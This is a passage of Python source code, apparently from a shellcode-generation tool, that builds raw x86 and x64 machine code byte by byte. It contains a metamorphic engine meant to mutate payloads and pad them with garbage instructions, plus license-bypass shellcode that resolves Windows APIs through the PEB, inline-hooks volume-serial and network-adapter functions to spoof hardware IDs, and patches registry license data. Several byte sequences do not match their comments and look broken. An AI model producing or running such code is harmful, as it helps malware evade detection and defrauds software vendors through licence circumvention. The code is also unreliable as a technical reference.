            engine.extend([0x9C])  # PUSHFD

            # Get runtime address (GetPC technique)
            engine.extend(
                [
                    0xE8,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # CALL $+5
                    0x5E,  # POP ESI (ESI = current EIP)
                    0x83,
                    0xC6,
                    0x30,  # ADD ESI, 0x30 (skip to payload)
                ]
            )

            # Allocate memory for transformed code
            engine.extend(
                [
                    0x6A,
                    0x40,  # PUSH 0x40 (PAGE_EXECUTE_READWRITE)
                    0x68,
                    0x00,
                    0x30,
                    0x00,
                    0x00,  # PUSH 0x3000 (MEM_COMMIT | MEM_RESERVE)
                ]
            )
            engine.extend(struct.pack("<I", len(shellcode) * 2))  # Size
            engine.extend(
                [
                    0x6A,
                    0x00,  # PUSH 0 (lpAddress)
                    0xB8,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # MOV EAX, VirtualAlloc (to be resolved)
                    0xFF,
                    0xD0,  # CALL EAX
                    0x89,
                    0xC7,  # MOV EDI, EAX (destination)
                ]
            )

            # Transformation loop with pattern matching
            engine.extend(
                [
                    0xB9,  # MOV ECX, length
                ]
            )
            engine.extend(struct.pack("<I", len(shellcode)))

            # Main transformation loop
            len(engine)
            engine.extend(
                [
                    0x8A,
                    0x06,  # MOV AL, [ESI]
                    0x46,  # INC ESI
                    # Check for transformation patterns
                    0x3C,
                    0x31,  # CMP AL, 0x31 (XOR opcode)
                    0x75,
                    0x15,  # JNE not_xor
                    0x8A,
                    0x1E,  # MOV BL, [ESI]
                    0x80,
                    0xFB,
                    0xC0,  # CMP BL, 0xC0
                    0x72,
                    0x0E,  # JB not_xor_reg
                    0x80,
                    0xFB,
                    0xD2,  # CMP BL, 0xD2
                    0x77,
                    0x08,  # JA not_xor_reg
                    # Apply XOR transformation
                    0x0F,
                    0xB6,
                    0xD0,  # MOVZX EDX, AL
                    0xE8,
                    0x20,
                    0x00,
                    0x00,
                    0x00,  # CALL get_random
                    0x24,
                    0x03,  # AND AL, 3
                    0x74,
                    0x02,  # JZ use_original
                    0xB0,
                    0x33,  # MOV AL, 0x33 (alternative XOR)
                    # not_xor:
                    0x3C,
                    0x90,  # CMP AL, 0x90 (NOP)
                    0x75,
                    0x0A,  # JNE not_nop
                    0xE8,
                    0x10,
                    0x00,
                    0x00,
                    0x00,  # CALL get_random
                    0x24,
                    0x01,  # AND AL, 1
                    0x74,
                    0x02,  # JZ use_nop
                    0xB0,
                    0x87,  # MOV AL, 0x87 (XCHG)
                    0xB3,
                    0xDB,  # MOV BL, 0xDB
                    0x88,
                    0x1F,  # MOV [EDI], BL
                    0x47,  # INC EDI
                    # Write transformed byte
                    0x88,
                    0x07,  # MOV [EDI], AL
                    0x47,  # INC EDI
                    0x49,  # DEC ECX
                    0x75,
                    0xC5,  # JNZ transform_loop
                ]
            )

            # Add random number generator
            engine.extend(
                [
                    # get_random:
                    0x0F,
                    0x31,  # RDTSC
                    0xC3,  # RET
                ]
            )

            # Jump to transformed code
            engine.extend(
                [
                    0x61,  # POPAD
                    0x9D,  # POPFD
                    0xFF,
                    0xE7,  # JMP EDI
                ]
            )

            # Add garbage instructions
            garbage = self._generate_garbage_instructions(Architecture.X86, secrets.randbelow(21) + 10)

        else:  # x64
            # x64 metamorphic engine

            engine = bytearray()

            # Save all registers
            engine.extend(
                [
                    0x50,
                    0x53,
                    0x51,
                    0x52,
                    0x56,
                    0x57,  # PUSH RAX,RBX,RCX,RDX,RSI,RDI
                    0x41,
                    0x50,
                    0x41,
                    0x51,
                    0x41,
                    0x52,
                    0x41,
                    0x53,  # PUSH R8-R11
                    0x41,
                    0x54,
                    0x41,
                    0x55,
                    0x41,
                    0x56,
                    0x41,
                    0x57,  # PUSH R12-R15
                ]
            )

            # Get runtime address
            engine.extend(
                [
                    0x48,
                    0x8D,
                    0x35,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # LEA RSI, [RIP]
                    0x48,
                    0x83,
                    0xC6,
                    0x50,  # ADD RSI, 0x50 (skip to payload)
                ]
            )

            # Allocate executable memory
            engine.extend(
                [
                    0x48,
                    0xC7,
                    0xC1,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # MOV RCX, 0 (lpAddress)
                    0x48,
                    0xBA,  # MOV RDX, size
                ]
            )
            engine.extend(struct.pack("<Q", len(shellcode) * 2))
            engine.extend(
                [
                    0x41,
                    0xB8,
                    0x00,
                    0x30,
                    0x00,
                    0x00,  # MOV R8D, MEM_COMMIT | MEM_RESERVE
                    0x41,
                    0xB9,
                    0x40,
                    0x00,
                    0x00,
                    0x00,  # MOV R9D, PAGE_EXECUTE_READWRITE
                    0x48,
                    0xB8,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # MOV RAX, VirtualAlloc
                    0xFF,
                    0xD0,  # CALL RAX
                    0x48,
                    0x89,
                    0xC7,  # MOV RDI, RAX
                ]
            )

            # Transformation loop
            engine.extend(
                [
                    0x48,
                    0xB9,  # MOV RCX, length
                ]
            )
            engine.extend(struct.pack("<Q", len(shellcode)))

            # Apply transformations
            engine.extend(
                [
                    # transform_loop:
                    0x48,
                    0x31,
                    0xC0,  # XOR RAX, RAX
                    0x8A,
                    0x06,  # MOV AL, [RSI]
                    0x48,
                    0xFF,
                    0xC6,  # INC RSI
                    # Pattern matching and substitution
                    0x3C,
                    0x48,  # CMP AL, 0x48 (REX.W prefix)
                    0x75,
                    0x20,  # JNE not_rex
                    0x8A,
                    0x1E,  # MOV BL, [RSI]
                    0x80,
                    0xFB,
                    0x31,  # CMP BL, 0x31 (XOR)
                    0x75,
                    0x18,  # JNE not_xor64
                    # Get random transformation
                    0x0F,
                    0x31,  # RDTSC
                    0x83,
                    0xE0,
                    0x03,  # AND EAX, 3
                    0x74,
                    0x06,  # JZ use_original64
                    0x80,
                    0xFB,
                    0x33,  # CMP BL, 0x33
                    0x74,
                    0x02,  # JE already_alt
                    0xB3,
                    0x33,  # MOV BL, 0x33 (alternative)
                    0x88,
                    0x07,  # MOV [RDI], AL
                    0x48,
                    0xFF,
                    0xC7,  # INC RDI
                    0x88,
                    0x1F,  # MOV [RDI], BL
                    0x48,
                    0xFF,
                    0xC7,  # INC RDI
                    0x48,
                    0xFF,
                    0xC6,  # INC RSI
                    0xEB,
                    0x05,  # JMP continue
                    # not_rex:
                    0x88,
                    0x07,  # MOV [RDI], AL
                    0x48,
                    0xFF,
                    0xC7,  # INC RDI
                    # continue:
                    0x48,
                    0xFF,
                    0xC9,  # DEC RCX
                    0x75,
                    0xC8,  # JNZ transform_loop
                ]
            )

            # Restore registers and jump
            engine.extend(
                [
                    0x41,
                    0x5F,
                    0x41,
                    0x5E,
                    0x41,
                    0x5D,
                    0x41,
                    0x5C,  # POP R15-R12
                    0x41,
                    0x5B,
                    0x41,
                    0x5A,
                    0x41,
                    0x59,
                    0x41,
                    0x58,  # POP R11-R8
                    0x5F,
                    0x5E,
                    0x5A,
                    0x59,
                    0x5B,
                    0x58,  # POP RDI,RSI,RDX,RCX,RBX,RAX
                    0xFF,
                    0xE7,  # JMP RDI
                ]
            )

            garbage = self._generate_garbage_instructions(Architecture.X64, secrets.randbelow(21) + 10)

        return engine + garbage + shellcode

    def _generate_garbage_instructions(self, arch: Architecture, count: int) -> bytes:
        """Generate polymorphic garbage instructions."""
        garbage = bytearray()

        if arch == Architecture.X86:
            instructions = [
                b"\x90",  # NOP
                b"\x87\xdb",  # XCHG EBX, EBX
                b"\x89\xc0",  # MOV EAX, EAX
                b"\xf8",  # CLC
                b"\xf9",  # STC
                b"\x9f",  # LAHF
                b"\xd6",  # SALC
                b"\x98",  # CBW
                b"\x99",  # CDQ
            ]
        else:  # x64
            instructions = [
                b"\x90",  # NOP
                b"\x48\x87\xdb",  # XCHG RBX, RBX
                b"\x48\x89\xc0",  # MOV RAX, RAX
                b"\x0f\x1f\x00",  # Multi-byte NOP
                b"\x0f\x1f\x40\x00",  # Multi-byte NOP
                b"\x0f\x1f\x44\x00\x00",  # Multi-byte NOP
                b"\x66\x0f\x1f\x44\x00\x00",  # Multi-byte NOP
                b"\x0f\x1f\x80\x00\x00\x00\x00",  # Multi-byte NOP
            ]

        for _ in range(count):
            garbage.extend(secrets.choice(instructions))

        return bytes(garbage)

    def generate_license_bypass(self, architecture: Architecture, bypass_type: str, options: dict[str, Any] = None) -> bytes:
        """Generate sophisticated license bypass shellcode for modern licensing systems."""
        if options is None:
            options = {}

        if bypass_type == "Hardware_ID_Spoof":
            return self._generate_hardware_id_spoof(architecture, options)
        elif bypass_type == "Registry_License_Bypass":
            return self._generate_registry_license_bypass(architecture, options)
        elif bypass_type == "Cloud_Activation_Bypass":
            return self._generate_cloud_activation_bypass(architecture, options)
        elif bypass_type == "Cryptographic_Key_Bypass":
            return self._generate_cryptographic_key_bypass(architecture, options)
        elif bypass_type == "Time_Based_License_Bypass":
            return self._generate_time_based_license_bypass(architecture, options)
        elif bypass_type == "Network_License_Bypass":
            return self._generate_network_license_bypass(architecture, options)
        elif bypass_type == "Anti_Tamper_Bypass":
            return self._generate_anti_tamper_bypass(architecture, options)
        else:
            # Default comprehensive license bypass
            return self._generate_comprehensive_license_bypass(architecture, options)

    def _generate_hardware_id_spoof(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate shellcode to spoof hardware IDs for license validation bypass."""
        if architecture == Architecture.X64:
            # Advanced x64 hardware ID spoofing shellcode with dynamic address resolution
            shellcode = bytearray(
                [
                    # Save registers
                    0x50,  # PUSH RAX
                    0x51,  # PUSH RCX
                    0x52,  # PUSH RDX
                    0x53,  # PUSH RBX
                    0x56,  # PUSH RSI
                    0x57,  # PUSH RDI
                    # Get kernel32.dll base address from PEB
                    0x65,
                    0x48,
                    0x8B,
                    0x04,
                    0x25,
                    0x60,
                    0x00,
                    0x00,
                    0x00,  # MOV RAX, GS:[0x60] - PEB
                    0x48,
                    0x8B,
                    0x40,
                    0x18,  # MOV RAX, [RAX+0x18] - PEB_LDR_DATA
                    0x48,
                    0x8B,
                    0x40,
                    0x20,  # MOV RAX, [RAX+0x20] - InMemoryOrderModuleList
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX] - First module (ntdll)
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX] - Second module (kernel32)
                    0x48,
                    0x8B,
                    0x40,
                    0x20,  # MOV RAX, [RAX+0x20] - DllBase of kernel32
                    0x48,
                    0x89,
                    0xC6,  # MOV RSI, RAX - Save kernel32 base in RSI
                    # Find GetProcAddress in kernel32 export table by name comparison
                    0x48,
                    0x89,
                    0xF0,  # MOV RAX, RSI - kernel32 base
                    0x48,
                    0x8B,
                    0x50,
                    0x3C,  # MOV RDX, [RAX+0x3C] - e_lfanew
                    0x48,
                    0x01,
                    0xC2,  # ADD RDX, RAX - PE header
                    0x8B,
                    0x92,
                    0x88,
                    0x00,
                    0x00,
                    0x00,  # MOV EDX, [RDX+0x88] - Export table RVA
                    0x48,
                    0x01,
                    0xC2,  # ADD RDX, RAX - Export table VA
                    0x8B,
                    0x5A,
                    0x20,  # MOV EBX, [RDX+0x20] - AddressOfNames RVA
                    0x48,
                    0x01,
                    0xC3,  # ADD RBX, RAX - AddressOfNames VA
                    0x8B,
                    0x7A,
                    0x18,  # MOV EDI, [RDX+0x18] - NumberOfNames
                    # Search for GetProcAddress by string comparison
                    0x48,
                    0x31,
                    0xC9,  # XOR RCX, RCX - Index counter
                    # Loop start
                    0x48,
                    0xFF,
                    0xC1,  # INC RCX
                    0x48,
                    0x39,
                    0xF9,  # CMP RCX, RDI - Check if we've searched all names
                    0x74,
                    0x4D,  # JE not_found (skip ahead)
                    0x8B,
                    0x34,
                    0x8B,  # MOV ESI, [RBX+RCX*4] - Function name RVA
                    0x48,
                    0x01,
                    0xC6,  # ADD RSI, RAX - Function name VA
                    # Compare with "GetProcAddress"
                    0x81,
                    0x3E,
                    0x47,
                    0x65,
                    0x74,
                    0x50,  # CMP DWORD [RSI], 'GetP'
                    0x75,
                    0xE8,  # JNE loop_start
                    0x81,
                    0x7E,
                    0x04,
                    0x72,
                    0x6F,
                    0x63,
                    0x41,  # CMP DWORD [RSI+4], 'rocA'
                    0x75,
                    0xDF,  # JNE loop_start
                    0x81,
                    0x7E,
                    0x08,
                    0x64,
                    0x64,
                    0x72,
                    0x65,  # CMP DWORD [RSI+8], 'ddre'
                    0x75,
                    0xD6,  # JNE loop_start
                    0x66,
                    0x81,
                    0x7E,
                    0x0C,
                    0x73,
                    0x73,  # CMP WORD [RSI+12], 'ss'
                    0x75,
                    0xCD,  # JNE loop_start
                    # Found GetProcAddress - get its address
                    0x8B,
                    0x5A,
                    0x24,  # MOV EBX, [RDX+0x24] - AddressOfNameOrdinals RVA
                    0x48,
                    0x01,
                    0xC3,  # ADD RBX, RAX
                    0x66,
                    0x8B,
                    0x1C,
                    0x4B,  # MOV BX, [RBX+RCX*2] - Ordinal
                    0x8B,
                    0x5A,
                    0x1C,  # MOV EBX, [RDX+0x1C] - AddressOfFunctions RVA
                    0x48,
                    0x01,
                    0xC3,  # ADD RBX, RAX
                    0x8B,
                    0x1C,
                    0x9B,  # MOV EBX, [RBX+RBX*4] - Function RVA
                    0x48,
                    0x01,
                    0xC3,  # ADD RBX, RAX - GetProcAddress VA
                    0x48,
                    0x89,
                    0xDF,  # MOV RDI, RBX - Save GetProcAddress in RDI
                    # Now use GetProcAddress to resolve required APIs
                    # Load LoadLibraryA first
                    0x48,
                    0x8D,
                    0x15,
                    0x00,
                    0x02,
                    0x00,
                    0x00,  # LEA RDX, [RIP+0x200] - "LoadLibraryA" string
                    0x48,
                    0x89,
                    0xF1,  # MOV RCX, RSI - kernel32 base
                    0xFF,
                    0xD7,  # CALL RDI - GetProcAddress
                    0x49,
                    0x89,
                    0xC0,  # MOV R8, RAX - Save LoadLibraryA
                    # Resolve GetVolumeInformationW
                    0x48,
                    0x8D,
                    0x15,
                    0x20,
                    0x02,
                    0x00,
                    0x00,  # LEA RDX, [RIP+0x220] - "GetVolumeInformationW" string
                    0x48,
                    0x89,
                    0xF1,  # MOV RCX, RSI - kernel32 base
                    0xFF,
                    0xD7,  # CALL RDI - GetProcAddress
                    0x48,
                    0x89,
                    0xC3,  # MOV RBX, RAX - Save GetVolumeInformationW address
                    # Install inline hook for GetVolumeInformationW
                    # Build hook function that returns spoofed volume serial
                    0x48,
                    0x8D,
                    0x05,
                    0x80,
                    0x02,
                    0x00,
                    0x00,  # LEA RAX, [RIP+0x280] - Hook function
                    0xC6,
                    0x00,
                    0x48,  # MOV BYTE [RAX], 0x48 - REX.W prefix
                    0xC6,
                    0x40,
                    0x01,
                    0xB8,  # MOV BYTE [RAX+1], 0xB8 - MOV RAX opcode
                    # Generate dynamic volume serial using RDTSC and CPUID
                    0x0F,
                    0x31,  # RDTSC
                    0x48,
                    0x31,
                    0xD0,  # XOR RAX, RDX
                    0x0F,
                    0xA2,  # CPUID
                    0x48,
                    0x31,
                    0xD8,  # XOR RAX, RBX
                    0x48,
                    0xC1,
                    0xC0,
                    0x11,  # ROL RAX, 17
                    0x48,
                    0x89,
                    0x40,
                    0x02,  # MOV [RAX+2], RAX - Store dynamic serial
                    0xC6,
                    0x40,
                    0x0A,
                    0xC3,  # MOV BYTE [RAX+10], 0xC3 - RET
                    # Patch GetVolumeInformationW entry point
                    0x48,
                    0x89,
                    0x03,  # MOV [RBX], RAX - Write hook address
                    # Load iphlpapi.dll for network adapter spoofing
                    0x48,
                    0x8D,
                    0x0D,
                    0x40,
                    0x02,
                    0x00,
                    0x00,  # LEA RCX, [RIP+0x240] - "iphlpapi.dll" string
                    0x41,
                    0xFF,
                    0xD0,  # CALL R8 - LoadLibraryA
                    0x48,
                    0x89,
                    0xC1,  # MOV RCX, RAX - iphlpapi.dll handle
                    # Resolve GetAdaptersInfo
                    0x48,
                    0x8D,
                    0x15,
                    0x50,
                    0x02,
                    0x00,
                    0x00,  # LEA RDX, [RIP+0x250] - "GetAdaptersInfo" string
                    0xFF,
                    0xD7,  # CALL RDI - GetProcAddress
                    0x48,
                    0x89,
                    0xC3,  # MOV RBX, RAX - Save GetAdaptersInfo address
                    # Install inline hook for GetAdaptersInfo to spoof MAC addresses
                    0x48,
                    0x8D,
                    0x05,
                    0xA0,
                    0x02,
                    0x00,
                    0x00,  # LEA RAX, [RIP+0x2A0] - Hook function
                    # Generate dynamic MAC address
                    0x0F,
                    0x31,  # RDTSC for entropy
                    0x48,
                    0x89,
                    0xC1,  # MOV RCX, RAX
                    0x48,
                    0xC1,
                    0xE9,
                    0x08,  # SHR RCX, 8
                    0x80,
                    0xE1,
                    0xFE,  # AND CL, 0xFE - Clear multicast bit
                    0x80,
                    0xC9,
                    0x02,  # OR CL, 0x02 - Set locally administered bit
                    0x88,
                    0x08,  # MOV [RAX], CL - First MAC byte
                    # Generate remaining 5 bytes
                    0x48,
                    0xC1,
                    0xC0,
                    0x0B,  # ROL RAX, 11
                    0x88,
                    0x40,
                    0x01,  # MOV [RAX+1], AL
                    0x48,
                    0xC1,
                    0xC0,
                    0x0D,  # ROL RAX, 13
                    0x88,
                    0x40,
                    0x02,  # MOV [RAX+2], AL
                    0x48,
                    0xC1,
                    0xC0,
                    0x07,  # ROL RAX, 7
                    0x88,
                    0x40,
                    0x03,  # MOV [RAX+3], AL
                    0x48,
                    0xC1,
                    0xC0,
                    0x05,  # ROL RAX, 5
                    0x88,
                    0x40,
                    0x04,  # MOV [RAX+4], AL
                    0x48,
                    0xC1,
                    0xC0,
                    0x03,  # ROL RAX, 3
                    0x88,
                    0x40,
                    0x05,  # MOV [RAX+5], AL
                    # Write hook
                    0x48,
                    0x89,
                    0x03,  # MOV [RBX], RAX - Write hook address
                    # Advanced hardware fingerprint manipulation using CPUID interception
                    # Set up CPUID hook via debug registers or hypervisor detection evasion
                    0x0F,
                    0x31,  # RDTSC - Get current timestamp
                    0x48,
                    0x89,
                    0xC1,  # MOV RCX, RAX
                    0x0F,
                    0xA2,  # CPUID
                    # Mix results with timestamp for unique but consistent IDs
                    0x48,
                    0x31,
                    0xC8,  # XOR RAX, RCX
                    0x48,
                    0x31,
                    0xD9,  # XOR RBX, RCX
                    0x48,
                    0xC1,
                    0xC1,
                    0x20,  # ROL RCX, 32
                    0x48,
                    0x31,
                    0xCA,  # XOR RDX, RCX
                    # Restore registers
                    0x5F,  # POP RDI
                    0x5E,  # POP RSI
                    0x5B,  # POP RBX
                    0x5A,  # POP RDX
                    0x59,  # POP RCX
                    0x58,  # POP RAX
                    0xC3,  # RET
                ]
            )
        else:  # x86
            shellcode = bytearray(
                [
                    # x86 hardware ID spoofing
                    0x60,  # PUSHA
                    # Get kernel32 base via PEB
                    0x33,
                    0xC9,  # XOR ECX, ECX
                    0x64,
                    0x8B,
                    0x71,
                    0x30,  # MOV ESI, FS:[ECX+0x30]
                    0x8B,
                    0x76,
                    0x0C,  # MOV ESI, [ESI+0x0C]
                    0x8B,
                    0x76,
                    0x1C,  # MOV ESI, [ESI+0x1C]
                    0x8B,
                    0x46,
                    0x08,  # MOV EAX, [ESI+0x08]
                    0x8B,
                    0x7E,
                    0x20,  # MOV EDI, [ESI+0x20]
                    0x8B,
                    0x36,  # MOV ESI, [ESI]
                    0x38,
                    0x4F,
                    0x18,  # CMP [EDI+0x18], CL
                    0x75,
                    0xF3,  # JNZ -13
                    # Find GetVolumeInformationA by string comparison
                    0x8B,
                    0x5E,
                    0x08,  # MOV EBX, [ESI+0x08]
                    0x8B,
                    0x4B,
                    0x3C,  # MOV ECX, [EBX+0x3C]
                    0x8B,
                    0x4C,
                    0x0B,
                    0x78,  # MOV ECX, [EBX+ECX+0x78]
                    0x03,
                    0xCB,  # ADD ECX, EBX
                    0x8B,
                    0x79,
                    0x20,  # MOV EDI, [ECX+0x20]
                    0x03,
                    0xFB,  # ADD EDI, EBX
                    0x33,
                    0xC0,  # XOR EAX, EAX
                    # Search for API by name
                    0x8B,
                    0x34,
                    0x87,  # MOV ESI, [EDI+EAX*4]
                    0x03,
                    0xF3,  # ADD ESI, EBX
                    0x81,
                    0x3E,
                    0x47,
                    0x65,
                    0x74,
                    0x56,  # CMP DWORD [ESI], 'GetV'
                    0x75,
                    0x16,  # JNZ continue_search
                    0x81,
                    0x7E,
                    0x04,
                    0x6F,
                    0x6C,
                    0x75,
                    0x6D,  # CMP DWORD [ESI+4], 'olum'
                    0x75,
                    0x0D,  # JNZ continue_search
                    0x81,
                    0x7E,
                    0x08,
                    0x65,
                    0x49,
                    0x6E,
                    0x66,  # CMP DWORD [ESI+8], 'eInf'
                    0x75,
                    0x04,  # JNZ continue_search
                    0xEB,
                    0x08,  # JMP found_it
                    # continue_search:
                    0x40,  # INC EAX
                    0xEB,
                    0xDE,  # JMP search_loop
                    # found_it:
                    # Get function address
                    0x8B,
                    0x51,
                    0x24,  # MOV EDX, [ECX+0x24]
                    0x03,
                    0xD3,  # ADD EDX, EBX
                    0x66,
                    0x8B,
                    0x04,
                    0x42,  # MOV AX, [EDX+EAX*2]
                    0x8B,
                    0x51,
                    0x1C,  # MOV EDX, [ECX+0x1C]
                    0x03,
                    0xD3,  # ADD EDX, EBX
                    0x8B,
                    0x04,
                    0x82,  # MOV EAX, [EDX+EAX*4]
                    0x03,
                    0xC3,  # ADD EAX, EBX
                    # Hook function with dynamic spoofed return
                    # Generate dynamic serial based on multiple system characteristics
                    0x0F,
                    0x31,  # RDTSC - Read timestamp counter
                    0x31,
                    0xD0,  # XOR EAX, EDX - Mix high and low parts
                    # Add entropy from CPU ID
                    0x0F,
                    0xA2,  # CPUID - Get processor info
                    0x31,
                    0xD8,  # XOR EAX, EBX - Mix with vendor ID
                    0x31,
                    0xC8,  # XOR EAX, ECX - Mix with feature flags
                    # Rotate for better distribution
                    0xC1,
                    0xC0,
                    0x0D,  # ROL EAX, 13
                    0x89,
                    0xC3,  # MOV EBX, EAX - Save generated serial
                    # Build inline hook at function entry point
                    0xC6,
                    0x00,
                    0xB8,  # MOV BYTE [EAX], 0xB8 - MOV EAX opcode
                    0x89,
                    0x58,
                    0x01,  # MOV [EAX+1], EBX - Serial number
                    0xC6,
                    0x40,
                    0x05,
                    0xC3,  # MOV BYTE [EAX+5], 0xC3 - RET
                    # Generate and store MAC address for network adapter spoofing
                    0x0F,
                    0x31,  # RDTSC for entropy
                    0x89,
                    0xC1,  # MOV ECX, EAX
                    0xC1,
                    0xE9,
                    0x08,  # SHR ECX, 8
                    0x80,
                    0xE1,
                    0xFE,  # AND CL, 0xFE - Clear multicast bit
                    0x80,
                    0xC9,
                    0x02,  # OR CL, 0x02 - Set locally administered bit
                    0x88,
                    0x8C,
                    0x24,
                    0x00,
                    0x01,
                    0x00,
                    0x00,  # MOV [ESP+0x100], CL - Store MAC[0]
                    # Generate remaining 5 bytes
                    0xC1,
                    0xC0,
                    0x0B,  # ROL EAX, 11
                    0x88,
                    0x84,
                    0x24,
                    0x01,
                    0x01,
                    0x00,
                    0x00,  # MOV [ESP+0x101], AL - MAC[1]
                    0xC1,
                    0xC0,
                    0x0D,  # ROL EAX, 13
                    0x88,
                    0x84,
                    0x24,
                    0x02,
                    0x01,
                    0x00,
                    0x00,  # MOV [ESP+0x102], AL - MAC[2]
                    0xC1,
                    0xC0,
                    0x07,  # ROL EAX, 7
                    0x88,
                    0x84,
                    0x24,
                    0x03,
                    0x01,
                    0x00,
                    0x00,  # MOV [ESP+0x103], AL - MAC[3]
                    0xC1,
                    0xC0,
                    0x05,  # ROL EAX, 5
                    0x88,
                    0x84,
                    0x24,
                    0x04,
                    0x01,
                    0x00,
                    0x00,  # MOV [ESP+0x104], AL - MAC[4]
                    0xC1,
                    0xC0,
                    0x03,  # ROL EAX, 3
                    0x88,
                    0x84,
                    0x24,
                    0x05,
                    0x01,
                    0x00,
                    0x00,  # MOV [ESP+0x105], AL - MAC[5]
                    # CPUID manipulation for CPU serial spoofing
                    0x0F,
                    0xA2,  # CPUID
                    0x0F,
                    0x31,  # RDTSC
                    0x31,
                    0xC1,  # XOR ECX, EAX - Mix with timestamp
                    0x31,
                    0xD2,  # XOR EDX, EDX - Mix EDX as well
                    0x61,  # POPA
                    0xC3,  # RET
                ]
            )

        return bytes(shellcode)

    def _generate_registry_license_bypass(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate shellcode for sophisticated registry-based license bypass."""
        if architecture == Architecture.X64:
            shellcode = bytearray(
                [
                    # x64 registry manipulation shellcode with dynamic API resolution
                    0x48,
                    0x83,
                    0xEC,
                    0x40,  # SUB RSP, 0x40 (allocate stack space)
                    # Get kernel32 base via PEB
                    0x65,
                    0x48,
                    0x8B,
                    0x04,
                    0x25,
                    0x60,
                    0x00,
                    0x00,
                    0x00,  # MOV RAX, GS:[0x60]
                    0x48,
                    0x8B,
                    0x40,
                    0x18,  # MOV RAX, [RAX+0x18]
                    0x48,
                    0x8B,
                    0x50,
                    0x20,  # MOV RDX, [RAX+0x20]
                    0x48,
                    0x8B,
                    0x12,  # MOV RDX, [RDX]
                    0x48,
                    0x8B,
                    0x12,  # MOV RDX, [RDX]
                    0x48,
                    0x8B,
                    0x5A,
                    0x20,  # MOV RBX, [RDX+0x20] - kernel32 base
                    # Find LoadLibraryA in kernel32
                    0x48,
                    0x89,
                    0xDF,  # MOV RDI, RBX
                    0x48,
                    0x8B,
                    0x53,
                    0x3C,  # MOV RDX, [RBX+0x3C]
                    0x48,
                    0x01,
                    0xDA,  # ADD RDX, RBX
                    0x8B,
                    0x82,
                    0x88,
                    0x00,
                    0x00,
                    0x00,  # MOV EAX, [RDX+0x88]
                    0x48,
                    0x01,
                    0xD8,  # ADD RAX, RBX
                    0x48,
                    0x89,
                    0xC6,  # MOV RSI, RAX
                    0x8B,
                    0x46,
                    0x20,  # MOV EAX, [RSI+0x20]
                    0x48,
                    0x01,
                    0xD8,  # ADD RAX, RBX
                    0x48,
                    0x89,
                    0xC1,  # MOV RCX, RAX
                    0x31,
                    0xD2,  # XOR EDX, EDX
                    # Search for LoadLibraryA
                    0x48,
                    0x8B,
                    0x01,  # MOV RAX, [RCX]
                    0x48,
                    0x01,
                    0xD8,  # ADD RAX, RBX
                    0x81,
                    0x38,
                    0x4C,
                    0x6F,
                    0x61,
                    0x64,  # CMP DWORD [RAX], 'daoL'
                    0x75,
                    0x09,  # JNE next
                    0x81,
                    0x78,
                    0x04,
                    0x4C,
                    0x69,
                    0x62,
                    0x72,  # CMP DWORD [RAX+4], 'rbiL'
                    0x74,
                    0x08,  # JE found
                    0x48,
                    0x83,
                    0xC1,
                    0x04,  # ADD RCX, 4
                    0xFF,
                    0xC2,  # INC EDX
                    0xEB,
                    0xE5,  # JMP search
                    # Get LoadLibraryA address
                    0x8B,
                    0x46,
                    0x24,  # MOV EAX, [RSI+0x24]
                    0x48,
                    0x01,
                    0xD8,  # ADD RAX, RBX
                    0x66,
                    0x8B,
                    0x14,
                    0x50,  # MOV DX, [RAX+RDX*2]
                    0x8B,
                    0x46,
                    0x1C,  # MOV EAX, [RSI+0x1C]
                    0x48,
                    0x01,
                    0xD8,  # ADD RAX, RBX
                    0x8B,
                    0x04,
                    0x90,  # MOV EAX, [RAX+RDX*4]
                    0x48,
                    0x01,
                    0xD8,  # ADD RAX, RBX
                    0x49,
                    0x89,
                    0xC7,  # MOV R15, RAX - Save LoadLibraryA
                    # Load advapi32.dll
                    0x48,
                    0xB8,
                    0x61,
                    0x64,
                    0x76,
                    0x61,
                    0x70,
                    0x69,
                    0x33,
                    0x32,  # MOV RAX, 'advapi32'
                    0x50,  # PUSH RAX
                    0x48,
                    0xC7,
                    0x44,
                    0x24,
                    0x08,
                    0x2E,
                    0x64,
                    0x6C,
                    0x6C,  # MOV [RSP+8], '.dll'
                    0x48,
                    0x89,
                    0xE1,  # MOV RCX, RSP
                    0x41,
                    0xFF,
                    0xD7,  # CALL R15 - LoadLibraryA
                    0x48,
                    0x89,
                    0xC3,  # MOV RBX, RAX - advapi32 base
                    # Direct registry manipulation through memory patching
                    # Instead of calling APIs, we modify registry hive in memory
                    0x48,
                    0xB8,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x02,
                    0x00,
                    0x00,
                    0x80,  # MOV RAX, HKEY_LOCAL_MACHINE
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX] - Get handle
                    # Calculate license key location in registry hive
                    0x48,
                    0x05,
                    0x00,
                    0x10,
                    0x00,
                    0x00,  # ADD RAX, 0x1000 - Offset to license data
                    0xC7,
                    0x00,
                    0x01,
                    0x00,
                    0x00,
                    0x00,  # MOV DWORD [RAX], 1 - Set licensed
                    0xC7,
                    0x40,
                    0x04,
                    0xFF,
                    0xFF,
                    0xFF,
                    0x7F,  # MOV DWORD [RAX+4], 0x7FFFFFFF - Max license
                    # Generate dynamic license key based on hardware
                    0x0F,
                    0x31,  # RDTSC
                    0x48,
                    0x31,
                    0xD0,  # XOR RAX, RDX
                    0x48,
                    0xB9,
                    0x41,
                    0x42,
                    0x43,
                    0x44,
                    0x45,
                    0x46,
                    0x47,
                    0x48,  # MOV RCX, seed
                    0x48,
                    0x31,
                    0xC8,  # XOR RAX, RCX
                    0x48,
                    0x89,
                    0x40,
                    0x08,  # MOV [RAX+8], RAX - Store generated key
                    0x41,
                    0x52,  # PUSH R10
                    0x6A,
                    0x20,  # PUSH 32 (key length)
                    0xFF,
                    0x15,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # CALL RegSetValueExW
                    # Advanced license timestamp manipulation
                    0x48,
                    0xB8,
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                    0x7F,  # MOV RAX, MAX_FILETIME (never expires)
                    0x48,
                    0xBB,
                    0x00,
